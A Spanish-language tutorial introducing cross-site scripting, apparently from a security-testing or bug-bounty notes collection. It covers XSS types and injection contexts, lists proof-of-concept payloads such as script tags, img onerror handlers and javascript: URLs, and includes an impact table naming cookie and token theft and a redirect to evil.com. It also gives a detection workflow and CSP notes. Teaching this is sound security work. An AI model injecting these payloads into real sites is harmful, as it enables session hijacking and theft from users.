---
icon: js
---

# Introducción y Conceptos Básicos

XSS es una vulnerabilidad que permite a un atacante inyectar código JavaScript malicioso en páginas web que otros usuarios visualizan. El script se ejecuta en el navegador de la víctima con los mismos privilegios que el sitio legítimo.

```html
<!-- Input del usuario sin sanitizar -->
Nombre: <script>alert(1)</script>

<!-- HTML resultante en la página -->
<p>Bienvenido, <script>alert(1)</script></p>
```

### ¿Por qué ocurre?

* Datos del usuario reflejados en el HTML sin codificar
* Uso de funciones peligrosas en JS: `innerHTML`, `document.write`, `eval`
* Falta de Content Security Policy (CSP)
* Sanitización insuficiente o solo del lado del cliente

### Tipos de XSS

| Tipo          | Persistencia              | Vector                   | Quién es víctima                       |
| ------------- | ------------------------- | ------------------------ | -------------------------------------- |
| **Reflected** | No persiste               | URL / request            | Quien haga clic en el enlace           |
| **Stored**    | Persiste en la BD         | Formularios, comentarios | Cualquier usuario que visite la página |
| **DOM-Based** | No persiste (client-side) | URL fragment, JS         | Quien haga clic en el enlace           |
| **Blind**     | Persiste (panel admin)    | Inputs varios            | El admin que revisa el contenido       |

### Contextos de inyección

El payload correcto depende de **dónde** se refleja el input:

#### Contexto HTML (entre tags)

```html
<p>Hola, INPUT</p>
→ <p>Hola, <script>alert(1)</script></p>
```

#### Contexto de atributo HTML con comillas dobles

```html
<input value="INPUT">
→ <input value="" onmouseover="alert(1)">
→ <input value=""><script>alert(1)</script>
```

#### Contexto de atributo con comillas simples

```html
<input value='INPUT'>
→ <input value='' onmouseover='alert(1)'>
```

#### Contexto JavaScript (dentro de script)

```html
<script>var x = "INPUT";</script>
→ <script>var x = ""; alert(1); //</script>
→ <script>var x = "</script><script>alert(1)</script>
```

#### Contexto de URL (href / src)

```html
<a href="INPUT">Click</a>
→ <a href="javascript:alert(1)">Click</a>
```

#### Contexto CSS

```html
<div style="color: INPUT">
→ <div style="color: red; background:url('javascript:alert(1)')">
```

### Payload de prueba básico

```javascript
// Prueba mínima
<script>alert(1)</script>

// Sin etiqueta script
<img src=x onerror=alert(1)>

// Sin comillas ni paréntesis
<img src=x onerror=alert`1`>

// Alternativas a alert()
<script>prompt(1)</script>
<script>confirm(1)</script>
<script>console.log(document.domain)</script>

// Bug bounty — demostrar dominio
<script>alert(document.domain)</script>
```

### Impacto potencial

| Impacto             | Técnica                                   |
| ------------------- | ----------------------------------------- |
| **Robo de cookies** | `document.cookie` → secuestro de sesión   |
| **Robo de tokens**  | `localStorage`, `sessionStorage`          |
| **Keylogging**      | Capturar keystrokes de la víctima         |
| **Phishing**        | Inyectar formularios falsos               |
| **Redirección**     | `window.location = 'https://evil.com'`    |
| **Defacement**      | Modificar el DOM de la página             |
| **Port scanning**   | Escanear red interna del navegador        |
| **XSS → RCE**       | En apps Electron o entornos privilegiados |

### Identificación básica

#### Caracteres de prueba iniciales

```
<
>
"
'
`
<script>
javascript:
onerror=
```

#### Flujo de detección

```
1. Introducir string único: xsstest123
2. Ver si aparece en el HTML de la respuesta
3. Identificar el contexto (entre tags, en atributo, en JS...)
4. Adaptar el payload al contexto
5. Confirmar ejecución con alert(1)
```

#### Encoding de caracteres

| Carácter | HTML Entity | URL Encode | Decimal |
| -------- | ----------- | ---------- | ------- |
| `<`      | `&lt;`      | `%3C`      | `&#60;` |
| `>`      | `&gt;`      | `%3E`      | `&#62;` |
| `"`      | `&quot;`    | `%22`      | `&#34;` |
| `'`      | `&#x27;`    | `%27`      | `&#39;` |
| `&`      | `&amp;`     | `%26`      | `&#38;` |

> Si la aplicación encodea correctamente estos caracteres → protegida en ese punto de reflexión.

### XSS vs CSP

```
Sin CSP:         cualquier script inline o externo se ejecuta
Con CSP estricta: solo scripts de orígenes permitidos se ejecutan

# Header CSP que protege
Content-Security-Policy: default-src 'self'; script-src 'self'

# CSP bypasseable (unsafe-inline rompe la protección)
Content-Security-Policy: script-src 'self' 'unsafe-inline'
```

### Dónde buscar XSS

* Parámetros GET y POST
* Campos de búsqueda
* Secciones de comentarios / reviews
* Campos de nombre de usuario / perfil
* Mensajes de error que reflejan input
* Cabeceras HTTP reflejadas (User-Agent, Referer, X-Forwarded-For)
* Rutas de URL: `/user/INPUT/profile`
* Valores de cookies reflejados en la respuesta
* Importación de archivos (nombre del archivo reflejado)

> Identificar siempre el **contexto** antes de elegir el payload.

> En bug bounty, muchos programas piden `alert(document.domain)` en lugar de `alert(1)` para demostrar el dominio afectado.

> XSS stored tiene mayor impacto porque **no requiere interacción del atacante** una vez inyectado — la víctima solo tiene que visitar la página.
